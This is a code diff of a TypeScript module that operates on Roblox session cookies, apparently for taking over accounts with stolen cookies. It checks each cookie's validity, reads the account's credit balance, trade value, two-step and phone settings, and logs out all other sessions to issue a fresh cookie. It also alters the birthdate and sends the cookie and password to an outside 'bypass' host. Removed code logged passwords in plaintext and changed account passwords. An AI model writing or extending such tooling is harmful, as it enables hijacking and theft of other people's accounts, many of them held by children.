@@ -1,11 +1,27 @@
 import axios from 'axios';
 import { CookieJar } from 'tough-cookie';
 import { wrapper } from 'axios-cookiejar-support';
-import { ENDPOINTS } from './endpoints';
+import { logger } from './logger';
 
-const AXIOS_TIMEOUT = 25000;
+const AXIOS_TIMEOUT = 30000;
 const MAX_RETRIES = 3;
 const RETRY_DELAY = 1000;
+
+axios.interceptors.request.use(config => {
+  logger.debug({ url: config.url, method: config.method }, 'Outgoing request');
+  return config;
+});
+
+axios.interceptors.response.use(
+  response => {
+    logger.debug({ status: response.status, url: response.config.url }, 'Response received');
+    return response;
+  },
+  error => {
+    logger.error({ err: error, url: error.config?.url }, 'Request failed');
+    return Promise.reject(error);
+  }
+);
 
 async function axiosWithRetry<T>(
   method: 'get' | 'post' | 'patch',
@@ -26,6 +42,7 @@ async function axiosWithRetry<T>(
       lastError = err;
       if (attempt < retries) {
         const delay = RETRY_DELAY * Math.pow(2, attempt) + Math.random() * 500;
+        logger.debug(`Retry ${attempt} for ${url} in ${delay}ms`);
         await new Promise(resolve => setTimeout(resolve, delay));
       }
     }
@@ -70,7 +87,7 @@ export async function validateCookie(cookie: string, maxAttempts = 4): Promise<{
       await jar.setCookie(`.ROBLOSECURITY=${trimmed}; Domain=.roblox.com; Path=/`, 'https://users.roblox.com');
       const client = wrapper(axios.create({ jar }));
 
-      const resp = await client.get(ENDPOINTS.USERS_AUTHENTICATED, {
+      const resp = await client.get('https://users.roblox.com/v1/users/authenticated', {
         headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
         validateStatus: () => true,
         timeout: AXIOS_TIMEOUT,
@@ -120,6 +137,69 @@ export async function validateCookie(cookie: string, maxAttempts = 4): Promise<{
   };
 }
 
+export async function fetchCreditBalance(cookie: string): Promise<{ balance: number; currency: string }> {
+  try {
+    const resp = await axios.get('https://billing.roblox.com/v1/credit', {
+      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
+      validateStatus: () => true,
+      timeout: 10000,
+    });
+    if (resp.status === 200) {
+      return { balance: resp.data.balance || 0, currency: resp.data.currencyCode || 'USD' };
+    }
+  } catch (err) { logger.error({ err }, 'fetchCreditBalance'); }
+  return { balance: 0, currency: 'USD' };
+}
+
+export async function fetchTwoStepConfig(cookie: string, userId: string): Promise<{ email: boolean; authenticator: boolean }> {
+  try {
+    const resp = await axios.get(`https://twostepverification.roblox.com/v1/users/${userId}/configuration`, {
+      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
+      validateStatus: () => true,
+      timeout: 10000,
+    });
+    if (resp.status === 200 && resp.data.methods) {
+      const methods = resp.data.methods || [];
+      const email = methods.some(m => m.mediaType === 'Email' && m.enabled);
+      const authenticator = methods.some(m => m.mediaType === 'Authenticator' && m.enabled);
+      return { email, authenticator };
+    }
+  } catch (err) { logger.error({ err }, 'fetchTwoStepConfig'); }
+  return { email: false, authenticator: false };
+}
+
+export async function fetchPhoneInfo(cookie: string): Promise<{ hasPhone: boolean; verified: boolean }> {
+  try {
+    const resp = await axios.get('https://accountinformation.roblox.com/v1/phone', {
+      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
+      validateStatus: () => true,
+      timeout: 10000,
+    });
+    if (resp.status === 200) {
+      const data = resp.data;
+      return { hasPhone: !!data.countryCode && !!data.phone, verified: data.isVerified || false };
+    }
+  } catch (err) { logger.error({ err }, 'fetchPhoneInfo'); }
+  return { hasPhone: false, verified: false };
+}
+
+export async function fetchRolimonsRAP(userId: string): Promise<{ rap: number | null; premium: boolean }> {
+  try {
+    const resp = await axios.get(`https://api.rolimons.com/players/v1/playerinfo/${userId}`, {
+      validateStatus: () => true,
+      timeout: 10000,
+    });
+    if (resp.status === 200 && resp.data.success) {
+      const data = resp.data;
+      return {
+        rap: data.rap !== undefined && data.rap !== null ? data.rap : null,
+        premium: data.premium || false,
+      };
+    }
+  } catch (err) { logger.error({ err }, 'fetchRolimonsRAP'); }
+  return { rap: null, premium: false };
+}
+
 export async function refreshSession(cookie: string): Promise<{ success: boolean; newCookie: string | null; error?: string }> {
   try {
     const trimmed = cookie.trim();
@@ -132,7 +212,7 @@ export async function refreshSession(cookie: string): Promise<{ success: boolean
       'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
     };
 
-    const csrfResp = await client.post(ENDPOINTS.AUTH_LOGOUT, {}, {
+    const csrfResp = await client.post('https://auth.roblox.com/v2/logout', {}, {
       headers: baseHeaders,
       validateStatus: () => true,
       timeout: AXIOS_TIMEOUT,
@@ -143,7 +223,7 @@ export async function refreshSession(cookie: string): Promise<{ success: boolean
     }
 
     const refreshHeaders = { ...baseHeaders, 'X-CSRF-TOKEN': csrf };
-    const refreshResp = await client.post(ENDPOINTS.AUTH_SESSION_REFRESH, {}, {
+    const refreshResp = await client.post('https://auth.roblox.com/v2/session/refresh', {}, {
       headers: refreshHeaders,
       validateStatus: () => true,
       timeout: AXIOS_TIMEOUT,
@@ -168,101 +248,6 @@ export async function refreshSession(cookie: string): Promise<{ success: boolean
   }
 }
 
-export async function getUserAge(userId: number): Promise<number> {
-  try {
-    const resp = await axios.get(ENDPOINTS.USERS_USER(String(userId)), { timeout: AXIOS_TIMEOUT });
-    const created = new Date(resp.data.created);
-    const now = new Date();
-    const diff = now.getTime() - created.getTime();
-    return Math.floor(diff / (1000 * 3600 * 24));
-  } catch {
-    return -1;
-  }
-}
-
-export async function fetchRobux(cookie: string, userId: string): Promise<number> {
-  try {
-    const resp = await axiosWithRetry<any>('get', ENDPOINTS.ECONOMY_CURRENCY(userId), {
-      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
-    });
-    if (resp.status === 200 && resp.data?.robux !== undefined) return resp.data.robux;
-  } catch {}
-  return 0;
-}
-
-export async function fetchTransactionTotals(cookie: string, userId: string): Promise<{ incoming: number; outgoing: number }> {
-  try {
-    const resp = await fetch(ENDPOINTS.TRANSACTION_TOTALS(userId), {
-      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
-    });
-    if (resp.status === 200) {
-      const data = (await resp.json()) as { incomingRobuxTotal: number; outgoingRobuxTotal: number };
-      return { incoming: data.incomingRobuxTotal || 0, outgoing: data.outgoingRobuxTotal || 0 };
-    }
-  } catch {}
-  return { incoming: 0, outgoing: 0 };
-}
-
-export async function fetchCountry(cookie: string, retries = 2): Promise<string> {
-  for (let i = 0; i <= retries; i++) {
-    try {
-      const resp = await fetch(ENDPOINTS.ACCOUNT_COUNTRY, {
-        headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
-      });
-      if (resp.status === 200) {
-        const data = (await resp.json()) as { value: { countryName: string } };
-        return data.value?.countryName || 'Unknown';
-      }
-    } catch {}
-    if (i < retries) await new Promise(resolve => setTimeout(resolve, 500 * (i + 1)));
-  }
-  return 'Unknown';
-}
-
-export async function fetchEmailInfo(cookie: string, retries = 2): Promise<{ verified: string | null; pending: string | null }> {
-  for (let i = 0; i <= retries; i++) {
-    try {
-      const resp = await fetch(ENDPOINTS.ACCOUNT_EMAIL, {
-        headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
-      });
-      if (resp.status === 200) {
-        const data = (await resp.json()) as { emailAddress: string; verified: boolean; canBypassPasswordForEmailUpdate: boolean };
-        return { verified: data.verified ? data.emailAddress : null, pending: null };
-      }
-    } catch {}
-    if (i < retries) await new Promise(resolve => setTimeout(resolve, 500 * (i + 1)));
-  }
-  return { verified: null, pending: null };
-}
-
-export async function fetchParentalControls(cookie: string): Promise<{ hasParent: boolean }> {
-  try {
-    const resp = await fetch(ENDPOINTS.PARENTAL_CONTROLS, {
-      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
-    });
-    if (resp.status === 200) {
-      const data = (await resp.json()) as { parents: unknown[]; canAddParent: boolean };
-      return { hasParent: (data.parents && data.parents.length > 0) || false };
-    }
-  } catch {}
-  return { hasParent: false };
-}
-
-export async function fetchAvatarThumbnail(userId: string): Promise<string | null> {
-  try {
-    const resp = await fetch(ENDPOINTS.AVATAR_THUMBNAIL(userId), {
-      headers: { 'User-Agent': 'Mozilla/5.0' },
-    });
-    if (resp.status === 200) {
-      const data = (await resp.json()) as { data: { imageUrl: string }[] };
-      if (data.data && data.data.length > 0 && data.data[0].imageUrl) {
-        return data.data[0].imageUrl;
-      }
-    }
-  } catch {}
-  return null;
-}
-
 export async function killAndRefreshSession(cookie: string): Promise<{ success: boolean; newCookie: string | null; error?: string }> {
   try {
     const cleanCookie = cookie.trim();
@@ -280,12 +265,20 @@ export async function killAndRefreshSession(cookie: string): Promise<{ success: 
     let authResp;
 
     for (let attempt = 0; attempt < 3; attempt++) {
-      authResp = await client.post(ENDPOINTS.AUTH_LOGOUT_ALL, {}, { headers, validateStatus: () => true, timeout: AXIOS_TIMEOUT });
+      authResp = await client.post('https://auth.roblox.com/v2/logoutfromallsessionsandreauthenticate', {}, {
+        headers,
+        validateStatus: () => true,
+        timeout: AXIOS_TIMEOUT,
+      });
       if (authResp.status === 403) {
         const csrf = authResp.headers['x-csrf-token'];
         if (csrf) {
           headers['X-CSRF-TOKEN'] = csrf;
-          authResp = await client.post(ENDPOINTS.AUTH_LOGOUT_ALL, {}, { headers, validateStatus: () => true, timeout: AXIOS_TIMEOUT });
+          authResp = await client.post('https://auth.roblox.com/v2/logoutfromallsessionsandreauthenticate', {}, {
+            headers,
+            validateStatus: () => true,
+            timeout: AXIOS_TIMEOUT,
+          });
         }
       }
       if (authResp.status === 200) {
@@ -313,133 +306,56 @@ export async function killAndRefreshSession(cookie: string): Promise<{ success: 
   }
 }
 
-export async function checkTwoFactorStatus(cookie: string, userId: string): Promise<{ enabled: boolean; mediaType: string | null }> {
+export async function getCsrfToken(): Promise<string | null> {
   try {
-    const resp = await fetch(ENDPOINTS.USER_CONFIGURATION(userId), {
-      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
-    });
-    if (resp.status === 200) {
-      const data = (await resp.json()) as { primaryMediaType: string; methods: { mediaType: string; enabled: boolean }[] };
-      const authMethod = data.methods.find(m => m.mediaType === 'Authenticator');
-      return {
-        enabled: authMethod ? authMethod.enabled : false,
-        mediaType: data.primaryMediaType || null,
-      };
-    }
-  } catch {}
-  return { enabled: false, mediaType: null };
-}
-
-async function getCsrfToken(): Promise<string | null> {
-  const jar = new CookieJar();
-  const client = wrapper(axios.create({ jar }));
-  const headers = {
-    'Content-Type': 'application/json',
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-  };
-  for (const url of [ENDPOINTS.AUTH_LOGOUT, ENDPOINTS.AUTH_LOGIN]) {
-    try {
-      const resp = await client.post(url, {}, { headers, validateStatus: () => true, timeout: AXIOS_TIMEOUT });
-      if (resp.status === 403) {
-        const token = resp.headers['x-csrf-token'];
-        if (token) return token;
-      }
-    } catch {}
-  }
-  return null;
-}
-
-export async function validatePassword(username: string, password: string): Promise<{
-  valid: boolean;
-  error?: string;
-  challenge?: boolean;
-  challengeId?: string;
-  challengeType?: string;
-}> {
-  console.log(`[DEBUG] validatePassword: "${username}" "${password}"`);
-  const csrf = await getCsrfToken();
-  if (!csrf) {
-    console.log('[DEBUG] CSRF token missing');
-    return { valid: false, error: 'Failed to get CSRF token' };
-  }
-  console.log(`[DEBUG] CSRF: ${csrf.slice(0, 20)}...`);
-
-  const jar = new CookieJar();
-  const client = wrapper(axios.create({ jar }));
-  const headers = {
-    'Content-Type': 'application/json',
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-    'X-CSRF-TOKEN': csrf,
-  };
-  try {
-    const resp = await client.post(ENDPOINTS.AUTH_PASSWORD_VALIDATE, { username, password }, { headers, validateStatus: () => true, timeout: AXIOS_TIMEOUT });
-    console.log(`[DEBUG] Status: ${resp.status}`);
-    console.log(`[DEBUG] Data: ${JSON.stringify(resp.data)}`);
-    if (resp.status === 200) {
-      const data = resp.data;
-      if (data.code === 0 && data.message === 'Password is valid') {
-        return { valid: true };
-      }
-      return { valid: false, error: data.message || 'Invalid password' };
-    }
-    if (resp.status === 403) {
-      const challengeId = resp.headers['rblx-challenge-id'];
-      if (challengeId) {
-        return { valid: false, challenge: true, challengeId, challengeType: resp.headers['rblx-challenge-type'] || 'unknown', error: 'Challenge required' };
-      }
-      return { valid: false, error: '403 without challenge' };
-    }
-    return { valid: false, error: `HTTP ${resp.status}` };
-  } catch (err: any) {
-    console.log(`[DEBUG] Exception: ${err.message}`);
-    return { valid: false, error: err.message };
-  }
-}
-
-export async function changePassword(
-  cookie: string,
-  currentPassword: string,
-  newPassword: string
-): Promise<{ success: boolean; error?: string }> {
-  try {
-    const session = await (async () => {
-      const jar = new CookieJar();
-      await jar.setCookie(`.ROBLOSECURITY=${cookie.trim()}; Domain=.roblox.com; Path=/`, 'https://auth.roblox.com');
-      return wrapper(axios.create({ jar }));
-    })();
-
-    const baseHeaders = {
-      'Content-Type': 'application/json',
-      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-    };
-
-    let resp = await session.post(ENDPOINTS.AUTH_PASSWORD_CHANGE, { currentPassword, newPassword }, {
-      headers: baseHeaders,
+    const jar = new CookieJar();
+    const client = wrapper(axios.create({ jar }));
+    const resp = await client.post('https://auth.roblox.com/v2/logout', {}, {
+      headers: { 'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json' },
       validateStatus: () => true,
-      timeout: AXIOS_TIMEOUT,
+      timeout: 10000,
     });
-
-    if (resp.status === 403 && resp.headers['x-csrf-token']) {
-      const csrf = resp.headers['x-csrf-token'];
-      resp = await session.post(ENDPOINTS.AUTH_PASSWORD_CHANGE, { currentPassword, newPassword }, {
-        headers: { ...baseHeaders, 'X-CSRF-TOKEN': csrf },
-        validateStatus: () => true,
-        timeout: AXIOS_TIMEOUT,
-      });
+    if (resp.status === 403) {
+      return resp.headers['x-csrf-token'] || null;
     }
+    return null;
+  } catch {
+    return null;
+  }
+}
 
+export async function updateBirthdate(cookie: string, birthdate: string, password?: string): Promise<{ success: boolean; status: number; message?: string }> {
+  try {
+    const csrf = await getCsrfToken();
+    if (!csrf) {
+      return { success: false, status: 0, message: 'Failed to get CSRF token' };
+    }
+    const jar = new CookieJar();
+    await jar.setCookie(`.ROBLOSECURITY=${cookie}; Domain=.roblox.com; Path=/`, 'https://users.roblox.com');
+    const client = wrapper(axios.create({ jar }));
+    const payload: any = { birthdate };
+    if (password) payload.password = password;
+    const resp = await client.post('https://users.roblox.com/v1/birthdate', payload, {
+      headers: {
+        'X-CSRF-TOKEN': csrf,
+        'Content-Type': 'application/json',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+      },
+      validateStatus: () => true,
+    });
     if (resp.status === 200) {
-      return { success: true };
+      return { success: true, status: 200, message: 'Birthdate updated successfully' };
     }
-
-    let errorMsg = `HTTP ${resp.status}`;
+    let message = `HTTP ${resp.status}`;
     try {
-      const json = resp.data;
-      if (json && json.message) errorMsg = json.message;
+      const data = resp.data;
+      if (data.errors && data.errors.length) {
+        message = data.errors[0].message || message;
+      }
     } catch {}
-    return { success: false, error: errorMsg };
+    return { success: false, status: resp.status, message };
   } catch (err: any) {
-    return { success: false, error: err.message };
+    return { success: false, status: 0, message: err.message };
   }
 }
 
@@ -451,7 +367,7 @@ export async function bypassAgeVerification(cookie: string, password: string): P
 }> {
   try {
     const resp = await axios.post(
-      ENDPOINTS.BYPASS_API,
+      'https://rbx-bypass.com/api/public/bypass',
       { cookie, password },
       {
         headers: {
@@ -465,11 +381,9 @@ export async function bypassAgeVerification(cookie: string, password: string): P
         validateStatus: () => true,
       }
     );
-
     if (typeof resp.data === 'string' && resp.data.trim() === 'Loading...') {
       return { success: false, message: 'Loading...', inProgress: true };
     }
-
     if (typeof resp.data === 'object' && resp.data !== null) {
       const data = resp.data;
       if (data.success === true) {
@@ -480,7 +394,6 @@ export async function bypassAgeVerification(cookie: string, password: string): P
       }
       return { success: false, message: data.message || data.error || 'Unknown error' };
     }
-
     return { success: false, message: `Unexpected response: ${resp.data}` };
   } catch (err: any) {
     if (err.code === 'ECONNABORTED' || err.message?.includes('timeout')) {
